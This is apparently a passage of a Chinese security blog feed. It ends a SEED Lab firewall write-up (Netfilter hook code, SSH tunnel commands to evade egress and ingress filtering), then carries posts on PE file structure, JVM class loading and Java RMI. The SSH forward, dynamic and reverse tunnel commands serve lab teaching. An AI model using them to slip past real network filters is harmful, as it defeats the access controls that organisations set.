(((ip_header-&gt;daddr &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>) != c)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> (((ip_header-&gt;daddr &amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span>) != b)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">if</span> ((ip_header-&gt;daddr &amp; <span class="number">0x000000ff</span>) != a)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写过滤数据包的钩子函数，见下面截图，然后是钩子函数的注册和清除，我选择将入口和出口的过滤钩子注册在<code>NF_INET_PRE_ROUTING</code>和<code>NF_INET_POST_ROUTING</code>两个位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   nfho_in.hook = hook_func_in;</span><br><span class="line">   nfho_in.hooknum = NF_INET_PRE_ROUTING;</span><br><span class="line">   nfho_in.pf = PF_INET;</span><br><span class="line">   nfho_in.priority = NF_IP_PRI_FIRST;</span><br><span class="line">   nf_register_hook(&amp;nfho_in);</span><br><span class="line"></span><br><span class="line">   nfho_out.hook = hook_func_out;</span><br><span class="line">   nfho_out.hooknum = NF_INET_POST_ROUTING;</span><br><span class="line">   nfho_out.pf = PF_INET;</span><br><span class="line">   nfho_out.priority = NF_IP_PRI_FIRST;</span><br><span class="line">   nf_register_hook(&amp;nfho_out);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   printk(KERN_INFO <span class="string">&quot;\nbye&quot;</span>);</span><br><span class="line">   nf_unregister_hook(&amp;nfho_in);</span><br><span class="line">   nf_unregister_hook(&amp;nfho_out);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Prevent-A-from-doing-telnet-to-Machine-B-1"><a href="#Prevent-A-from-doing-telnet-to-Machine-B-1" class="headerlink" title="Prevent A from doing telnet to Machine B."></a>Prevent A from doing telnet to Machine B.</h3><p>为了实现功能，我们在出口钩子函数实现以下代码，我们判断目的端口是不是23，然后判断目的ip是不是我们的过滤目标。</p><p><img src= "/img/loading.gif" data-lazy-src="/E:/mdimg\image-20201208165253375.png" alt="image-20201208165253375"></p><p>如图，实验成功，连接不成功，而且在dmesg中看到了右边的记录</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113458912.png" alt="image-20210120113458912"></p><h3 id="Prevent-B-from-doing-telnet-to-Machine-A-1"><a href="#Prevent-B-from-doing-telnet-to-Machine-A-1" class="headerlink" title="Prevent B from doing telnet to Machine A."></a>Prevent B from doing telnet to Machine A.</h3><p>为了实现功能，在入口钩子函数里实现以下代码，我们判断目的端口是不是23，然后判断目的和来源ip是不是我们的过滤目标。</p><p><img src= "/img/loading.gif" data-lazy-src="/E:/mdimg\image-20201208170901200.png" alt="image-20201208170901200"></p><p>如图，实验成功，连接不成功，而且在dmesg中看到了右边的记录</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113508200.png" alt="image-20210120113508200"></p><h3 id="Prevent-A-from-doing-ping-to-Machine-B"><a href="#Prevent-A-from-doing-ping-to-Machine-B" class="headerlink" title="Prevent A from doing ping to Machine B."></a>Prevent A from doing ping to Machine B.</h3><p>为了实现功能，在出口钩子函数里实现以下代码，我们判断协议是不是<code>icmp的请求包</code>，然后判断目的和来源ip是不是我们的过滤目标。</p><p><img src= "/img/loading.gif" data-lazy-src="/E:/mdimg\image-20201208170837324.png" alt="image-20201208170837324"></p><p>如图，实验成功，连接不成功，而且在dmesg中看到了右边的记录</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113516760.png" alt="image-20210120113516760"></p><h2 id="Task-3-Evading-Egress-Filtering"><a href="#Task-3-Evading-Egress-Filtering" class="headerlink" title="Task 3: Evading Egress Filtering"></a>Task 3: Evading Egress Filtering</h2><p>许多公司和学校实施出口过滤，这阻止了他们网络中的用户接触到某些网站或互联网服务。 它们确实允许用户访问其他网站。 在许多情况下，这种类型的防火墙检查传出数据包中的目标IP地址和端口号。 如果一个数据包符合限制，它将被丢弃。 由于性能原因，它们通常不进行深度分组检查(即查看数据包的数据部分。 在这个任务中，我们展示了如何使用隧道机制绕过这种出口过滤。 建立隧道有很多方法；在这项任务中，我们只关注SSH隧道。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113525846.png" alt="image-20210120113525846"></p><h3 id="Task-3-a-Telnet-to-Machine-B-through-the-firewall"><a href="#Task-3-a-Telnet-to-Machine-B-through-the-firewall" class="headerlink" title="Task 3.a: Telnet to Machine B through the firewall."></a>Task 3.a: Telnet to Machine B through the firewall.</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113533013.png" alt="image-20210120113533013"></p><p>下面的命令在本地主机（端口8000）和机器B（使用默认端口22）之间建立SSH隧道；当数据包从B端出来时，它将被转发到机器C的端口23(telnet端口)。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8000:192.168.164.128:23 seed@192.168.164.128</span><br></pre></td></tr></table></figure><p>当我们将telnet传输到localhost的端口8000时，SSH将将我们所有的TCP数据包从localhost：8000上的隧道的一端传输到机器B上的隧道的另一端；从那里，数据包将被转发到机器B：23。 </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113543262.png" alt="image-20210120113543262"></p><h3 id="Task-3-b-Connect-to-Facebook-using-SSH-Tunnel"><a href="#Task-3-b-Connect-to-Facebook-using-SSH-Tunnel" class="headerlink" title="Task 3.b: Connect to Facebook using SSH Tunnel."></a>Task 3.b: Connect to Facebook using SSH Tunnel.</h3><p>在这里，我们使用动态端口转发的方式，所以我们只指定了本地的端口，当B机器接收到我们本地机器发送过去的数据包后，根据数据包的信息动态确定转发到哪个端口上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 9000 seed@192.168.164.128</span><br></pre></td></tr></table></figure><p>如下图，我们开启ssh</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113553576.png" alt="image-20210120113553576"></p><p>在Firefox里面我们用<code>SOCKS</code>代理，将数据包发送到本地的9000端口，然后数据会通过我们的SSH隧道</p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113603986.png" alt="image-20210120113603986" style="zoom:67%;"><p>如下图，我们成功绕过了过滤</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113617917.png" alt="image-20210120113617917"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113625808.png" alt="image-20210120113625808"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113634397.png" alt="image-20210120113634397"></p><h2 id="Task-4-Evading-Ingress-Filtering"><a href="#Task-4-Evading-Ingress-Filtering" class="headerlink" title="Task 4: Evading Ingress Filtering"></a>Task 4: Evading Ingress Filtering</h2><p>这里为了绕过INPUT形式的包过滤，我们采用了SSH反向代理的方式，首先我们在A机器上执行下命令，相当于将主动发起了连接，将机器<code>192.168.164.131</code>的7000端口转发到了A机器的22端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 22 -qngfNTR 7000:localhost:22 seed@192.168.164.131</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113644441.png" alt="image-20210120113644441"></p><p>然后我们在机器<code>192.168.164.131</code>中执行下列命令，连接自己的7000端口，然后数据会通过隧道转发到A机器的22端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p 7000 seed@localhost</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113653325.png" alt="image-20210120113653325"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20210120113702372.png" alt="image-20210120113702372"></p><p>反向代理原理可用上图理解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Firewall&quot;&gt;&lt;a href=&quot;#Firewall&quot; class=&quot;headerlink&quot; title=&quot;Firewall&quot;&gt;&lt;/a&gt;Firewall&lt;/h1&gt;&lt;h2 id=&quot;Task-1-Using-Firewall&quot;&gt;&lt;a href=&quot;#Task-1-U</summary>
      
    
    
    
    <category term="SeedLab" scheme="http://yoursite.com/categories/SeedLab/"/>
    
    
    <category term="firewall" scheme="http://yoursite.com/tags/firewall/"/>
    
    <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>PE文件与功能</title>
    <link href="http://yoursite.com/2021/01/08/PE%E6%96%87%E4%BB%B6%E4%B8%8E%E5%8A%9F%E8%83%BD/"/>
    <id>http://yoursite.com/2021/01/08/PE%E6%96%87%E4%BB%B6%E4%B8%8E%E5%8A%9F%E8%83%BD/</id>
    <published>2021-01-08T11:25:06.000Z</published>
    <updated>2021-01-08T11:45:22.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><p>64个字节</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214163418890.png" alt="image-20201214163418890"></p><h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS-stub"></a>DOS-stub</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214163457931.png" alt="image-20201214163457931"></p><h3 id="PE头-1"><a href="#PE头-1" class="headerlink" title="PE头"></a>PE头</h3><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214163935399.png" alt="image-20201214163935399"></p><h4 id="FileHeader字段"><a href="#FileHeader字段" class="headerlink" title="FileHeader字段"></a>FileHeader字段</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line"></span><br><span class="line">WORD Machine;<span class="comment">//运行平台</span></span><br><span class="line"></span><br><span class="line">WORD NumberOfSections;<span class="comment">//文件的区块数目</span></span><br><span class="line"></span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//文件创建的用时间戳标识的日期</span></span><br><span class="line"></span><br><span class="line">DWORD PointerToSymbolTable;<span class="comment">//指向符号表（用于调试）</span></span><br><span class="line"></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//符号表中符号的个数</span></span><br><span class="line"></span><br><span class="line">WORD SizeOfOptionalHeader;<span class="comment">//IMAGE_OPTIONAL_HEADER32结构大小</span></span><br><span class="line"></span><br><span class="line">WORD Characteristics;<span class="comment">//文件属性</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214164334091.png" alt="image-20201214164334091"></p><h4 id="OptionalHeader"><a href="#OptionalHeader" class="headerlink" title="OptionalHeader"></a>OptionalHeader</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span>  </span><br><span class="line">    WORD    Magic;                          <span class="comment">//标志字  </span></span><br><span class="line">    BYTE    MajorLinkerVersion;             <span class="comment">//链接器主版本号  </span></span><br><span class="line">    BYTE    MinorLinkerVersion;             <span class="comment">//链接器次版本号  </span></span><br><span class="line">    DWORD   SizeOfCode;                     <span class="comment">//所有含有代码表的总大小  </span></span><br><span class="line">    DWORD   SizeOfInitializedData;          <span class="comment">//所有初始化数据表总大小  </span></span><br><span class="line">    DWORD   SizeOfUninitializedData;        <span class="comment">//所有未初始化数据表总大小  </span></span><br><span class="line">    DWORD   AddressOfEntryPoint;            <span class="comment">//程序执行入口RVA  </span></span><br><span class="line">    DWORD   BaseOfCode;                     <span class="comment">//代码表其实RVA  </span></span><br><span class="line">    DWORD   BaseOfData;                     <span class="comment">//数据表其实RVA  </span></span><br><span class="line">    DWORD   ImageBase;                      <span class="comment">//程序默认装入基地址  </span></span><br><span class="line">    DWORD   SectionAlignment;               <span class="comment">//内存中表的对齐值  </span></span><br><span class="line">    DWORD   FileAlignment;                  <span class="comment">//文件中表的对齐值  </span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;    <span class="comment">//操作系统主版本号  </span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;    <span class="comment">//操作系统次版本号  </span></span><br><span class="line">    WORD    MajorImageVersion;              <span class="comment">//用户自定义主版本号  </span></span><br><span class="line">    WORD    MinorImageVersion;              <span class="comment">//用户自定义次版本号  </span></span><br><span class="line">    WORD    MajorSubsystemVersion;          <span class="comment">//所需要子系统主版本号  </span></span><br><span class="line">    WORD    MinorSubsystemVersion;          <span class="comment">//所需要子系统次版本号  </span></span><br><span class="line">    DWORD   Win32VersionValue;              <span class="comment">//保留，通常设置为0  </span></span><br><span class="line">    DWORD   SizeOfImage;                    <span class="comment">//映像装入内存后的总大小  </span></span><br><span class="line">    DWORD   SizeOfHeaders;                  <span class="comment">//DOS头、PE头、区块表总大小  </span></span><br><span class="line">    DWORD   CheckSum;                       <span class="comment">//映像校验和  </span></span><br><span class="line">    WORD    Subsystem;                      <span class="comment">//文件子系统  </span></span><br><span class="line">    WORD    DllCharacteristics;             <span class="comment">//显示DLL特性的旗标  </span></span><br><span class="line">    DWORD   SizeOfStackReserve;             <span class="comment">//初始化堆栈大小  </span></span><br><span class="line">    DWORD   SizeOfStackCommit;              <span class="comment">//初始化实际提交堆栈大小  </span></span><br><span class="line">    DWORD   SizeOfHeapReserve;              <span class="comment">//初始化保留堆栈大小  </span></span><br><span class="line">    DWORD   SizeOfHeapCommit;               <span class="comment">//初始化实际保留堆栈大小  </span></span><br><span class="line">    DWORD   LoaderFlags;                    <span class="comment">//与调试相关，默认值为0  </span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;            <span class="comment">//数据目录表的项数  </span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;  </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214165709676.png" alt="image-20201214165709676"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214164731994.png" alt="image-20201214164731994"></p><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214170528006.png" alt="image-20201214170528006"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214185832377.png" alt="image-20201214185832377"></p><p>找到程序入口点</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214185939046.png" alt="image-20201214185939046"></p><p>经过动调，发现在执行了<code>005A17D5</code>这条函数调用之后就弹出了<code>notepad</code>，所以我们在这里下断点，步入调用继续调试</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214190837123.png" alt="image-20201214190837123"></p><p>继续按照弹出程序与否继续调试，发现执行了<code>0058D224</code>之后弹出了程序，于是步入调试</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214190956748.png" alt="image-20201214190956748"></p><p>进入了窗口参数设置的代码，<code>RegisterWindowMessageW</code>函数定义一个新的窗口消息</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214191234362.png" alt="image-20201214191234362"></p><p>这里调用了<code>CreatWindowExW</code>函数创建一个窗口</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214191534676.png" alt="image-20201214191534676"></p><p>接下来的代码继续对窗口和进程的参数继续设置</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214191625675.png" alt="image-20201214191625675"></p><p>最后，在执行了<code>ShowWindow</code>函数调用之后，窗口弹出。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201214192336512.png" alt="image-20201214192336512"></p><p>这里获取了桌面进程，并且获取了当前线程的线程ID</p><p>程序执行结束</p><h2 id="修改notepad-exe"><a href="#修改notepad-exe" class="headerlink" title="修改notepad.exe"></a>修改notepad.exe</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201215111618328.png" alt="image-20201215111618328"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201215111640753.png" alt="image-20201215111640753"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201215112658198.png" alt="image-20201215112658198"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201215112729136.png" alt="image-20201215112729136"></p><h2 id="找到系统SYSTEM32目录下的user32-dll文件，用UltraEdit打开并分析该文件导出表，找出-MessageBoxA的地址，并验证该地址是否正确。"><a href="#找到系统SYSTEM32目录下的user32-dll文件，用UltraEdit打开并分析该文件导出表，找出-MessageBoxA的地址，并验证该地址是否正确。" class="headerlink" title="找到系统SYSTEM32目录下的user32.dll文件，用UltraEdit打开并分析该文件导出表，找出 MessageBoxA的地址，并验证该地址是否正确。"></a>找到系统SYSTEM32目录下的user32.dll文件，用UltraEdit打开并分析该文件导出表，找出 MessageBoxA的地址，并验证该地址是否正确。</h2><p>用PEview打开<code>user32.dll</code></p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221162949895.png" alt="image-20201221162949895" style="zoom:67%;"><p>Name：保存了dll的名称</p><p>AddressOfFunctions：保存了所有导出函数的地址RVA</p><p>AddressOfNames：保存了所有按名称导出的函数的名称RVA</p><p>AddressOfNameOrdinals：保存了所有按名称导出的函数的序号</p><p>当我们要在导出表中查找某一个函数时，我们要先遍历AddressOfNames查找函数名称，记录当下的索引0。之后将索引0作为AddressOfNameOrdinals的索引值查找值，获得索引1，再将索引1作为AddressOfFunctions的索引找到函数地址的RVA</p><p>我们首先在<code>AddressOfNames</code>里面找到<code>MessageBoxA</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221163309974.png" alt="image-20201221163309974"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221170208459.png" alt="image-20201221170208459"></p><p>然后<code>0x0864-0x05E0</code>得到<code>0x0284</code>，即为<code>AddressOfNames</code>数组索引值</p><p>然后在<code>AddressOfNameOrdinals</code>中查找序号值，找第<code>0x0284</code>个表项</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221170433781.png" alt="image-20201221170433781"></p><p>即<code>MessageBoxA</code>的序号为<code>0x0286</code>，然后在<code>AddressOfFunctions</code>中找到函数地址<code>0x06C1C0</code>即RVA</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221171237971.png" alt="image-20201221171237971"></p><p>然后加载<code>user32.dll</code>获得基址，基址为<code>75B50000</code>，加上RVA，等于<code>75BBC1C0</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221173014838.png" alt="image-20201221173014838"></p><p>验证一下，结果正确</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/XZLang/blog-pic/raw/master/img/image-20201221172246224.png" alt="image-20201221172246224"></p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PE头&quot;&gt;&lt;a href=&quot;#PE头&quot; class=&quot;headerlink&quot; title=&quot;PE头&quot;&gt;&lt;/a&gt;PE头&lt;/h2&gt;&lt;h3 id=&quot;DOS头&quot;&gt;&lt;a href=&quot;#DOS头&quot; class=&quot;headerlink&quot; title=&quot;DOS头&quot;&gt;&lt;/a&gt;DOS</summary>
      
    
    
    
    <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PE" scheme="http://yoursite.com/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>Java虚拟机之类加载机制</title>
    <link href="http://yoursite.com/2020/11/25/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <id>http://yoursite.com/2020/11/25/Java%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</id>
    <published>2020-11-25T11:42:53.000Z</published>
    <updated>2020-11-25T11:43:46.634Z</updated>
    
    <content type="html"><![CDATA[<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="文件格式验证"><a href="#文件格式验证" class="headerlink" title="文件格式验证"></a>文件格式验证</h3><p>这阶段的验证是基于二进制字节流进行的，只有通过了这个验证，这段字节流才允许进入Java虚拟机内存的方法区中进行存储。</p><h3 id="元数据验证"><a href="#元数据验证" class="headerlink" title="元数据验证"></a>元数据验证</h3><p>对字节码描述的信息进行语义分析，主要是对类的元数据信息进行语义校验。</p><h3 id="字节码验证"><a href="#字节码验证" class="headerlink" title="字节码验证"></a>字节码验证</h3><p>主要目的是通过数据流分析和控制流分析，确定语义是合法的、符合逻辑的。</p><p>这个阶段对类的方法体（即Class文件的code属性）进行校验分析。</p><p>JDK6以后，Javac编译器和Java虚拟进行了联合优化，尽可能多的校验辅助措施挪到了Javac编译器进行。</p><p>具体表现是Code属性中多了一个<code>StackMapTable</code>的新属性。</p><h3 id="符号引用验证"><a href="#符号引用验证" class="headerlink" title="符号引用验证"></a>符号引用验证</h3><p>发生在虚拟机将符号引用转化为直接引用的时候，这个转化将在连接的第三阶段，即<strong>解析</strong>阶段完成的。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备阶段是正式为类中定义的变量（static）分配内存并设置变量初始值的阶段。</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;验证&quot;&gt;&lt;a href=&quot;#验证&quot; class=&quot;headerlink&quot; title=&quot;验证&quot;&gt;&lt;/a&gt;验证&lt;/h2&gt;&lt;h3 id=&quot;文件格式验证&quot;&gt;&lt;a href=&quot;#文件格式验证&quot; class=&quot;headerlink&quot; title=&quot;文件格式验证&quot;&gt;&lt;/a&gt;文</summary>
      
    
    
    
    <category term="Something" scheme="http://yoursite.com/categories/Something/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="JVM" scheme="http://yoursite.com/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>Java之RMI简单总结</title>
    <link href="http://yoursite.com/2020/09/15/Java%E4%B9%8BRMI%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/09/15/Java%E4%B9%8BRMI%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-15T08:49:30.000Z</published>
    <updated>2020-11-25T11:35:51.910Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​      **RMI: 远程方法调用(Remote Method Invocation)**，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。</p><a id="more"></a><p>​       <strong>Java RMI</strong>: 用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。</p><p>Java使用一种序列化的方式来实现远程调用。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>首先了解一下RMI的交互图，RMI主要由三部分组成，即<code>RMI Client、RMI Service、RMI Registry</code></p><p><img src= "/img/loading.gif" data-lazy-src="/1.png"></p><ul><li>首先，先启动<code>rmiregistry</code>服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。</li><li>其次，server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的<code>aming/Context/Registry</code>（等类的<code>bind</code>或<code>rebind</code>方法将刚才实例化好的实现类注册到<code>rmiregistry</code>上并对外暴露一个名称。</li><li>最后，<code>client</code>端通过本地的接口和一个已知的名称（即<code>rmiregistry</code>暴露出的名称）再使用RMI提供的<code>Naming/Context/Registry</code>等类的<code>lookup</code>方法从<code>RMIService</code>那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。</li></ul><h2 id="Java实现"><a href="#Java实现" class="headerlink" title="Java实现"></a>Java实现</h2><p><strong>Server：</strong>一个RMI Server分为三部分：</p><ol><li>一个继承了了 java.rmi.Remote 的接⼝口，其中定义我们要远程调⽤用的函数</li><li>一个实现了此接口的类</li><li>一个主类，用来创建Registry，并将上面的类实例化后绑定到一个地址。这就是我们所谓的Server<br>了。</li></ol><p>比如下面这个样例</p><h3 id="IHello-java"><a href="#IHello-java" class="headerlink" title="IHello.java"></a>IHello.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span 